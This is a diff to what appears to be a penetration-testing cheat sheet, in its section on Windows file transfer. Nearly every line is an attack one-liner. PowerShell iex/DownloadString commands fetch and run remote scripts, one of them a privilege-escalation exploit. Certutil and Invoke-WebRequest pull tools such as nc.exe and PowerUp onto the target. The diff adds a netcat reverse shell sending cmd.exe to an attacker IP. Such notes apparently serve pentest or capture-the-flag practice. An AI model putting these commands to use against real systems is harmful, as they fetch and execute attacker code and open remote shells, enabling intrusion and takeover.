@@ -277,14 +277,12 @@
 ### Windows: get file
   - powershell iex (New-Object Net.WebClient).DownloadString('http://IP:PORT/Invoke-name.ps1'); Invoke-name -Reverse -IPAddress your-ip -Port your-port
     - C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
-
+  - nc.exe $ATTACKING_IP PORT -e cmd.exe
   - powershell -c Invoke-Webrequest -OutFile winPeas.bat http://Attcker/File
-  
   - powershell -c "(new-object System.Net.WebClient).Downloadfile('https://Attcker/File', 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')" = Load the script
-  
   - iex(New-Object Net.WebClient).DownloadString("http://10.9.1.255:80/PowerUp.ps1")dir
-
   - powershell -c wget "http://Attcker/File -outfile "PowerUp.ps1"
+  - powershell IWR -Uri 'http://10.10.16.2:8000/nc64.exe' -Outfile c:\nc.exe
 
   - **certutil** -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
   
